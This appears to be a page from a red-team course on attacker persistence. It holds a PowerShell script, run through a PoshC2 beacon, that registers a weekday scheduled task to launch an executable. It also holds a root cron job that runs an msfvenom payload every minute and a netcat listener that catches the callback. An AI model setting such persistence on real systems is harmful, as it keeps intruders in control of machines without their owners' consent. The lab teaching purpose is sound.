# Windows Persistence Using Scheduled Tasks and Poshc2

1. With your new beacon lets set simple persistence using `scheduled task` 
2. On parrot lets create a `.ps1` for our persistence 
3. If you have sublime installed run , alternatively use vim
    ```
    subl scktask.ps1
    ```

    ```
    vim scktask.ps1
    ```
4. Paste the following and save your script
    ```powershell
    $outpath = "C:\window\public\downloads\test.exe"
    $action = New-ScheduledTaskAction -Execute $outpath
    $days = 'Monday', 'Tuesday', 'Wednesday', 'Thursday', 'Friday'
    $trigger = New-ScheduledTaskTrigger -weekly -DaysOfWeek $days -At 8am
    Register-ScheduledTask -Action $action -Trigger $trigger -Taskname "Persistence Test" -Description "We got persistence"
    ```
5. In your beacon run pslo
    ```powershell
    pslo 
    ```
6. You should get confirmation your script work 

7. Lets verify our persistence is working by running sharpps 
    ```powershell
    sharpps get-scheduledtask -Taskname "Persistence Test"
    ```

# Linux Persistence Using Cornjobs and Msfvenom

1. Create a script to run the payload you created:
    ```sh
    vi job.sh
    ```
    
    ```sh
    #!/bin/sh
    /location/of/payload/yup.elf
    exit 0
    ```
2. Create a job in cron to run:
    ```sh
    sudo crontab -e
    ```
    * Below all of the comments, add these lines:
    ```sh
    SHELL=/bin/sh
    * * * * *   cd /location/of/script/ && sh job.sh
    ```

3. Verify that cron is running:
    ```sh
    ps axfww | grep cron
    #If not, troubleshoot to get it running
    /etc/init.d/cron <status/stop/start/restart>
    service cron <status/stop/start/restart>
    systemctl <status/stop/start/restart> crond.service
    ```

4. On your parrot box, run your netcat command as you did previously:
    ```sh
    sudo nc -nlvp 80
    ```

## [Return to course page](README.md)